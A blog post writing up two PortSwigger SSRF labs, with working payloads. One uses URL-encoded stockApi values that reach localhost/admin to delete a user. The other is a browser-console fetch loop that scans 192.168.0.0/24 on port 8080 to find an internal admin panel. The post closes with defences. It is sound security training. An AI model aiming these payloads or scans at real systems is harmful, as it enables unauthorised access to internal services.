---
layout: post
title:  "Portswigger Server-Side Request Forgery (SSRF)"
date:   2026-03-29
author: C. Casquatch
category: TidBits
comments: false
tag: ['portswigger', 'burpsuite', 'SSRF', appsec]
---

> Some notes on SSRF: appsec

### SSRF is when an attacker causes an application to make an HTTP request back to a server via its loopback network interface. The server is being tricked into reaching areas of the application and its network that aren't normally accessible to outside users. This is dangerous because servers often trust requests coming from themselves implicitly — so by forcing the server to make the request, you inherit that trust and bypass access controls that would block an external user.

## Lab 1 — Basic SSRF Against the Local Server

The stock checker feature made requests to an external API via a stockApi parameter. By changing this parameter to point to http://localhost/admin the server would make the request from its own loopback interface, bypassing access controls.

Initial Mistake — Editing in the Elements Panel
My first attempt was modifying the stock API URL in the browser's Elements panel in DevTools. This only changes the visual DOM in the browser's memory — it never affects what actually gets sent to the server. The request has to be modified at the HTTP level.

Solution — Using the Browser Console with Fetch
I used "Copy as fetch" from the Network tab in DevTools to get the raw request, then modified the stockApi value in the console. An important gotcha here was the syntax — wrapping the URL in backticks inside the body string caused a SyntaxError:

```
// WRONG - backticks cause a syntax error
"body": "stockApi=`http://localhost/admin/delete?username=carlos`"

// CORRECT - URL must be properly URL-encoded
"body": "stockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos"
```

The value needed to be URL-encoded since the request uses `application/x-www-form-urlencoded` content type — the same encoding style as the original request body.

**Steps to Delete Carlos**
1. Copy the stock check request as fetch from the Network tab
2. Change the `stockApi` body value to `http%3A%2F%2Flocalhost%2Fadmin` and run it in the console
3. Read the response HTML to find the delete link for carlos
4. Run the fetch again with `http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos`
5. The server makes the request from its own loopback, inheriting admin trust, and deletes carlos

## Lab 2 — SSRF with Internal IP Range Scan

This lab required scanning the internal `192.168.0.X` range on port `8080` across all 256 possible addresses to find a hidden admin interface.

**Burp Intruder Attempt**
I set up Burp Intruder with the payload position around the last octet:
```
stockApi=http%3A%2F%2F192.168.0.§1§%3A8080%2F
```

With a Numbers payload from 0 to 255. However all responses came back with the same status and length — likely due to Burp Community Edition rate-limiting Intruder requests, causing them all to timeout and return similar error responses.

Solution — Console Fetch Loop
Instead I ran a loop in the browser console that fired requests for all 256 addresses and logged any response that wasn't a connection error:
```
for (let i = 1; i < 256; i++) {
    fetch("https://YOUR-LAB-ID.web-security-academy.net/product/stock", {
        method: "POST",
        credentials: "include",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: `stockApi=http%3A%2F%2F192.168.0.${i}%3A8080%2F`
    }).then(r => r.text()).then(t => { if (!t.includes("Could not connect")) console.log(i, t) })
}
```

This narrowed it down to two candidates — 192.168.0.1 and 192.168.0.115.

Finding the Right IP
I then tested each individually in the console with /admin appended. The one returning actual HTML admin panel content rather than a connection error was 192.168.0.115. I then ran the delete request:
```
fetch("https://YOUR-LAB-ID.web-security-academy.net/product/stock", {
    method: "POST",
    credentials: "include",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    body: "stockApi=http%3A%2F%2F192.168.0.115%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos"
}).then(r => r.text()).then(t => console.log(t))
```

SSRF is dangerous because internal networks often have far weaker access controls than external-facing ones — they assume traffic is already trusted. Any feature that makes server-side HTTP requests based on user-supplied URLs is a potential SSRF vector. Defences include allowlisting permitted URLs/IP ranges, blocking requests to loopback and private IP ranges, and never trusting user-supplied URLs for internal requests.

<button onclick="history.back()">Go Back</button>
